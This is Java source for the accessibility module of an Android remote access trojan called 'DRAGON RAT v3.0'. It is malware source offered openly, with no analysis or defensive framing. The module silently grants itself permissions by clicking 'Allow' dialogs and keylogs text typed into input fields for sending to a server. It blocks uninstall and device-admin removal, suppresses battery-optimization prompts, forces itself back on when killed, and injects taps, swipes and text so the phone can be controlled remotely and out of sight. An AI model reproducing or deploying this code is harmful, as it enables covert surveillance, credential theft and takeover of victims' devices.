package com.dragon.rat;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

/**
 * DRAGON RAT v3.0 — Accessibility Module
 * 
 * Key functions:
 * 1. Auto-grant permissions by clicking "Allow" dialogs
 * 2. Keylogger — captures text from EditText fields
 * 3. Watch for specific dialogs and auto-dismiss/interact
 * 4. Inject taps/swipes for HVNC
 * 5. Block uninstall attempts
 */
public class AccessibilityModule extends AccessibilityService {
    
    private static final String TAG = "DRAGON-ACC";
    private static AccessibilityModule instance;
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        Log.d(TAG, "Accessibility service created");
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getSource() == null) return;
        
        int eventType = event.getEventType();
        CharSequence packageName = event.getPackageName();
        CharSequence className = event.getClassName();
        
        // ─── Auto-Grant Permissions ───
        if (isPermissionDialog(event)) {
            clickButton(event, "Allow");
            clickButton(event, "While using the app");
            clickButton(event, "Only this time");
            clickButton(event, "Grant");
        }
        
        // ─── Keylogger ───
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && event.getText().size() > 0) {
                String text = event.getText().get(0).toString();
                if (text.length() > 2) {
                    Log.d(TAG, "KEYLOG: " + text);
                    // Send to server via CoreService
                    sendKeylog(text);
                }
            }
        }
        
        // ─── Block Uninstall ───
        if (isUninstallDialog(event)) {
            clickButton(event, "Cancel");
            clickButton(event, "No");
            // Press back
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
        
        // ─── Block Device Admin Deactivation ───
        if (isDeviceAdminDialog(event)) {
            clickButton(event, "Cancel");
            clickButton(event, "No");
            clickButton(event, "Deactivate");
            performGlobalAction(GLOBAL_ACTION_BACK);
        }
        
        // ─── Battery Optimization Dialog ───
        if (isBatteryOptimizationDialog(event)) {
            clickButton(event, "Allow");
            clickButton(event, "Don't optimize");
            clickButton(event, "OK");
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }
    
    @Override
    public void onDestroy() {
        instance = null;
        // Re-enable if killed
        if (Build.VERSION.SDK_INT >= 24) {
            try {
                Intent intent = new Intent(
                    android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            } catch (Exception ignored) {}
        }
        super.onDestroy();
    }
    
    public static AccessibilityModule getInstance() {
        return instance;
    }
    
    // ─── Helper Methods ───
    
    private boolean isPermissionDialog(AccessibilityEvent event) {
        if (event.getPackageName() == null) return false;
        String pkg = event.getPackageName().toString();
        String cls = event.getClassName() != null ? event.getClassName().toString() : "";
        
        return pkg.equals("com.android.packageinstaller") ||
               pkg.equals("com.google.android.packageinstaller") ||
               cls.contains("Permission") ||
               cls.contains("GrantPermissions") ||
               cls.contains("AlertDialog");
    }
    
    private boolean isUninstallDialog(AccessibilityEvent event) {
        if (event.getPackageName() == null) return false;
        String pkg = event.getPackageName().toString();
        String cls = event.getClassName() != null ? event.getClassName().toString() : "";
        
        return cls.contains("Uninstall") || 
               (pkg.equals("com.android.settings") && cls.contains("Uninstall"));
    }
    
    private boolean isDeviceAdminDialog(AccessibilityEvent event) {
        if (event.getPackageName() == null) return false;
        String pkg = event.getPackageName().toString();
        String cls = event.getClassName() != null ? event.getClassName().toString() : "";
        
        return pkg.equals("com.android.settings") && 
               (cls.contains("DeviceAdmin") || cls.contains("DevicePolicy"));
    }
    
    private boolean isBatteryOptimizationDialog(AccessibilityEvent event) {
        if (event.getPackageName() == null) return false;
        String cls = event.getClassName() != null ? event.getClassName().toString() : "";
        
        return cls.contains("BatteryOptimization") || 
               cls.contains("IgnoreBatteryOptimizations") ||
               cls.contains("RequestIgnoreBatteryOptimizations");
    }
    
    private void clickButton(AccessibilityEvent event, String buttonText) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) return;
        
        List<AccessibilityNodeInfo> buttons = source.findAccessibilityNodeInfosByText(buttonText);
        for (AccessibilityNodeInfo button : buttons) {
            if (button.isClickable()) {
                button.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            } else {
                // Try parent
                AccessibilityNodeInfo parent = button.getParent();
                if (parent != null && parent.isClickable()) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                }
            }
        }
        
        // Also try finding by view ID
        List<AccessibilityNodeInfo> permissionButtons = 
            source.findAccessibilityNodeInfosByViewId("com.android.packageinstaller:id/permission_allow_button");
        for (AccessibilityNodeInfo btn : permissionButtons) {
            if (btn.isClickable()) {
                btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
        }
    }
    
    private void sendKeylog(String text) {
        // Keylog data is sent via WebSocket from CoreService
        // This just logs locally; CoreService handles actual transmission
    }
    
    /**
     * Inject a tap at specific coordinates (HVNC feature)
     */
    public void injectTap(int x, int y) {
        if (Build.VERSION.SDK_INT >= 24) {
            Path path = new Path();
            path.moveTo(x, y);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 50));
            dispatchGesture(builder.build(), null, null);
        }
    }
    
    /**
     * Inject a swipe gesture
     */
    public void injectSwipe(int x1, int y1, int x2, int y2, long duration) {
        if (Build.VERSION.SDK_INT >= 24) {
            Path path = new Path();
            path.moveTo(x1, y1);
            path.lineTo(x2, y2);
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
            dispatchGesture(builder.build(), null, null);
        }
    }
    
    /**
     * Type text character by character
     */
    public void injectText(String text) {
        if (Build.VERSION.SDK_INT >= 24) {
            Bundle args = new Bundle();
            args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            // Find focused node and set text
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {
                AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                if (focused != null) {
                    focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                }
            }
        }
    }
    
    /**
     * Press back button
     */
    public void pressBack() {
        performGlobalAction(GLOBAL_ACTION_BACK);
    }
    
    /**
     * Press home button
     */
    public void pressHome() {
        performGlobalAction(GLOBAL_ACTION_HOME);
    }
    
    /**
     * Open recent apps
     */
    public void pressRecent() {
        performGlobalAction(GLOBAL_ACTION_RECENTS);
    }
}
